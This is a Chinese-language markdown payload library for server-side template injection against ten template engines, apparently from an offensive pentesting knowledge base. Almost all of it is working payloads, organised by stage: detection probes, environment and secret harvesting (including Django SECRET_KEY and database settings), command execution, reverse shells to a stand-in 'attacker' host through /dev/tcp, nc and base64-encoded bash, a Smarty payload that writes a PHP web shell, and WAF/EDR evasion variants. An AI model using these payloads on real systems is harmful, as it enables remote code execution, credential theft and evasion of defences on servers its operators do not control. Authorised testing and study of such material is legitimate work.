# RCE — SSTI 模板注入 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖 Jinja2 / FreeMarker / Velocity / Thymeleaf / Smarty / Mako / Tornado / Django / ERB / Pug 共 10 个模板引擎。先用通用探针 `{{7*7}}` / `${7*7}` / `#{7*7}` / `%{7*7}` 定位引擎,再挑对应章节。

---

### Jinja2模板注入  `ssti-jinja2`
Jinja2/Twig模板注入攻击技术
子类：**Jinja2** · tags: `ssti` `jinja2` `twig` `template`

**前置条件：** 使用Jinja2/Twig模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测模板注入_
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
如果输出49或配置信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```

**3. 3. 命令执行**
_执行系统命令_
```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```

**2. 使用request对象**
_通过request参数传递_
```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```

---

### FreeMarker模板注入  `ssti-freemarker`
FreeMarker模板引擎注入攻击技术
子类：**FreeMarker** · tags: `ssti` `freemarker` `java` `template`

**前置条件：** 使用FreeMarker模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测FreeMarker模板注入_
```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
如果输出49或freemarker，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```

**3. 3. 命令执行 - new**
_使用Execute类执行命令_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

**4. 4. 命令执行 - api**
_使用ObjectConstructor执行命令_
```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```

**2. 使用内置函数**
_直接实例化执行_
```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```

---

### Velocity模板注入  `ssti-velocity`
Velocity模板引擎注入攻击技术
子类：**Velocity** · tags: `ssti` `velocity` `java` `template`

**前置条件：** 使用Velocity模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Velocity模板注入_
```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
如果输出49或版本信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```

**3. 3. 命令执行 - ClassTool**
_使用ClassTool执行命令_
```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```

**4. 4. 命令执行 - 反射**
_使用反射执行命令_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

**2. 使用Unicode**
_使用Unicode编码绕过_
```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

---

### Thymeleaf模板注入  `ssti-thymeleaf`
Thymeleaf模板引擎注入攻击技术
子类：**Thymeleaf** · tags: `ssti` `thymeleaf` `java` `spring` `template`

**前置条件：** 使用Thymeleaf模板引擎；Spring框架；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Thymeleaf模板注入_
```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
如果输出49，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```

**3. 3. 命令执行 - Spring表达式**
_使用Spring表达式执行命令_
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```

**4. 4. 命令执行 - ProcessBuilder**
_使用ProcessBuilder执行命令_
```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```

**2. 使用反射**
_使用反射绕过_
```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```

**3. URL编码**
_使用字节数组绕过_
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# 使用字节数组构造命令
```

---

### Smarty模板注入  `ssti-smarty`
Smarty模板引擎注入攻击技术
子类：**Smarty** · tags: `ssti` `smarty` `php` `template`

**前置条件：** 使用Smarty模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Smarty模板注入_
```
{$smarty.version}
{7*7}
{$smarty.template}
如果输出版本或49，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```

**3. 3. 命令执行 - system**
_使用system函数执行命令_
```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```

**4. 4. 命令执行 - passthru**
_使用passthru函数执行命令_
```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```

**5. 5. 命令执行 - exec**
_使用exec函数执行命令_
```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```

**6. 6. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```

**2. 变量赋值**
_使用变量赋值绕过_
```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```

**3. 使用PHP函数**
_WAF绕过技术_
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```

---

### Mako模板注入  `ssti-mako`
Mako模板引擎注入攻击技术
子类：**Mako** · tags: `ssti` `mako` `python` `template`

**前置条件：** 使用Mako模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Mako模板注入_
```
${7*7}
${self}
${self.module}
如果输出49或模块信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```

**3. 3. 命令执行 - os模块**
_使用os模块执行命令_
```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```

**4. 4. 命令执行 - subprocess**
_使用subprocess执行命令_
```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```

**2. 使用__import__**
_使用__import__导入模块_
```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```

**3. 使用getattr**
_使用getattr绕过_
```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```

---

### Tornado模板注入  `ssti-tornado`
Tornado模板引擎注入攻击技术
子类：**Tornado** · tags: `ssti` `tornado` `python` `template`

**前置条件：** 使用Tornado模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Tornado模板注入_
```
{{7*7}}
{{handler}}
{{request}}
如果输出49或handler对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```

**3. 3. 命令执行 - os**
_使用os模块执行命令_
```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```

**4. 4. 命令执行 - subprocess**
_使用subprocess执行命令_
```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```

**2. 使用__import__**
_使用__import__导入模块_
```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```

**3. 使用handler**
_通过handler访问_
```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```

---

### Django模板注入  `ssti-django`
Django模板引擎注入攻击技术
子类：**Django** · tags: `ssti` `django` `python` `template`

**前置条件：** 使用Django模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Django模板注入_
```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
如果输出49或request对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```

**3. 3. 命令执行 - 通过settings**
_尝试通过settings访问_
```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# Django模板默认沙箱，难以直接执行命令
# 需要找到可利用的对象链
```

**4. 4. 命令执行 - 对象链**
_通过对象链访问_
```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# 尝试访问Django内部对象
```

**5. 5. 敏感信息泄露**
_泄露敏感配置_
```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```

**WAF/EDR 绕过变体：**

**1. 使用过滤器**
_使用Django过滤器_
```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```

**2. 使用for循环**
_使用for循环遍历_
```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```

---

### ERB模板注入  `ssti-erb`
ERB(Ruby)模板引擎注入攻击技术
子类：**ERB** · tags: `ssti` `erb` `ruby` `template`

**前置条件：** 使用ERB模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测ERB模板注入_
```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
如果输出49或文件信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```

**3. 3. 命令执行 - 反引号**
_使用反引号执行命令_
```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```

**4. 4. 命令执行 - system**  _[linux]_
_使用system/exec执行命令并获取反弹Shell_
```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```

**2. 使用%语法**
_使用%x语法执行命令_
```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```

**3. 使用Open3**
_使用Open3模块_
```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```

---

### Pug/Jade模板注入  `ssti-pug`
Pug/Jade模板引擎注入攻击技术
子类：**Pug** · tags: `ssti` `pug` `jade` `nodejs` `template`

**前置条件：** 使用Pug/Jade模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Pug模板注入_
```
#{7*7}
#{this}
#{global}
如果输出49或global对象，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
#{process}
#{process.env}
#{global.process}
#{require}
```

**3. 3. 命令执行 - child_process**
_使用child_process执行命令_
```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```

**4. 4. 命令执行 - execSync**
_使用execSync执行命令_
```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

**2. 使用global**
_使用global对象_
```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```

**3. 使用this**
_使用this.constructor_
```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`10-framework.md`](10-framework.md)(SpEL/OGNL 框架表达式)
